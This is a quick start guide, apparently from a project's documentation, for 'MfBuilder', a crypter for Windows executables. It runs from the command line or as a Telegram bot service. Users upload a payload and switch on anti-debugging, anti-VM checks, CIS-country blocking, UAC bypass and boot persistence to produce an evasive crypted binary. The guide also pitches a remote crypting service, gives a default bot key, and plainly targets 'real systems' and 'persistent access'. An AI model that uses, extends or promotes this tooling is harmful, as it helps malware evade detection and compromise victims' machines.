# Quick Start Guide

## ?? Get Started in 5 Minutes

### Option 1: Telegram Bot Mode (Easiest)

#### Step 1: Install Dependencies
```bash
# Ubuntu/Debian
sudo apt-get install -y pkg-config libssl-dev

# Or see DEPENDENCIES.md for other platforms
```

#### Step 2: Setup Bot
```bash
# Get a bot token from @BotFather on Telegram
# (Just message @BotFather and use /newbot command)

# Configure your token
cp .env.example .env
nano .env  # Add your token here
```

#### Step 3: Run Bot
```bash
cargo run -- --bot
```

#### Step 4: Use Bot
1. Find your bot on Telegram
2. Send `/start`
3. Enter key: `MfCrypter2024` (change in src/telegram_bot.rs for production!)
4. Upload your .exe file
5. Configure options by sending numbers (1-6) or 'format'
6. Send `build` when ready
7. Receive your crypted binary! ??

---

### Option 2: CLI Mode (Traditional)

#### Step 1: Install Dependencies
```bash
# Ubuntu/Debian
sudo apt-get install -y pkg-config libssl-dev
```

#### Step 2: Configure
```bash
# Edit configuration
nano build.json

# Example:
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": true,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "binder": false
}
```

#### Step 3: Prepare Binary
```bash
# Copy your binary to crypt
cp /path/to/your/binary.exe payload.exe
```

#### Step 4: Build
```bash
cargo run
```

#### Step 5: Get Result
Your crypted binary will be in `out.bat` or `out.exe`

---

## ?? Common Use Cases

### Use Case 1: Quick Test with Bot
**Scenario**: You want to quickly test crypting a binary with different configurations.

```
1. Start bot: cargo run -- --bot
2. Send binary to bot
3. Toggle options to test different configs
4. Get results immediately
```

### Use Case 2: Batch Processing with CLI
**Scenario**: You have multiple binaries to process with the same config.

```bash
# Create a script
for binary in *.exe; do
    cp "$binary" payload.exe
    cargo run
    mv out.bat "${binary%.exe}_crypted.bat"
done
```

### Use Case 3: Remote Crypting Service
**Scenario**: Provide crypting as a service to authorized users.

```
1. Deploy bot on server
2. Share bot username with authorized users
3. Give them the auth key (change default!)
4. Users can crypt binaries remotely 24/7
```

---

## ?? Configuration Quick Reference

| Feature | What It Does | When to Enable |
|---------|--------------|----------------|
| **Anti Debug** | Detects debuggers | Always recommended |
| **Anti VM** | Detects virtual machines | If targets are real systems |
| **Blacklist CIS** | Blocks CIS countries | Geographic restrictions |
| **UAC Bypass** | Attempts privilege escalation | If admin rights needed |
| **Single Instance** | Prevents multiple instances | Avoid conflicts |
| **Persistence** | Auto-start on boot | For persistent access |
| **Output: BAT** | Batch file wrapper | More evasive |
| **Output: EXE** | Direct executable | Cleaner, simpler |

---

## ?? Security Checklist

Before deploying the bot:

- [ ] Change authentication key from default
- [ ] Set strong `TELOXIDE_TOKEN`
- [ ] Never commit `.env` file
- [ ] Monitor bot logs
- [ ] Consider user ID restrictions
- [ ] Test in isolated environment first
- [ ] Review legal implications

---

## ?? Troubleshooting

### "Could not find openssl"
```bash
# Ubuntu/Debian
sudo apt-get install libssl-dev pkg-config

# See DEPENDENCIES.md for other platforms
```

### "Invalid key" in bot
- Make sure you're sending exactly: `MfCrypter2024`
- Or check what key is set in `src/telegram_bot.rs`

### "Build failed"
- Ensure MSBuild is installed (for .NET binaries)
- Check that payload.exe is valid
- Review error logs

### Bot not responding
- Verify token in `.env` is correct
- Check bot is running with `--bot` flag
- Ensure network connectivity

---

## ?? Bot Example Session

```
You: /start
Bot: ?? Welcome to MfBuilder Crypter Bot
     Please enter your authentication key to continue:

You: MfCrypter2024
Bot: ? Authentication successful!
     Do you want to crypt a binary?
     Reply: yes or no

You: yes
Bot: ?? Please upload your binary (.exe file)
     ?? Only .exe files are supported!

You: [upload myapp.exe]
Bot: ? Binary uploaded successfully!
     ?? Detected Type: .NET x64
     
     ?? Crypter Configuration
     1. Anti Debug: ? OFF
     2. Anti VM: ? OFF
     ...

You: 1
Bot: [Shows updated menu with Anti Debug ON]

You: 2
Bot: [Shows updated menu with Anti VM ON]

You: build
Bot: ?? Starting build process...
     ?? Building crypted binary...
     ? Build completed successfully!
     [Sends crypted file]
     ?? Done! Your crypted binary is ready!
```

---

## ?? Next Steps

- Read [BOT_SETUP.md](BOT_SETUP.md) for detailed bot configuration
- Check [README.md](../README.md) for full feature list
- Review [CHANGELOG.md](../CHANGELOG.md) for recent changes
- See [DEPENDENCIES.md](DEPENDENCIES.md) for build requirements

## ?? Tips

- Start with default settings, then customize
- Test crypted binaries in safe environment
- Use bot mode for quick iterations
- Use CLI mode for automation/scripts
- Keep authentication key secret
- Monitor disk space (temp files)

---

**Ready to start? Pick your mode and follow the steps above! ??**
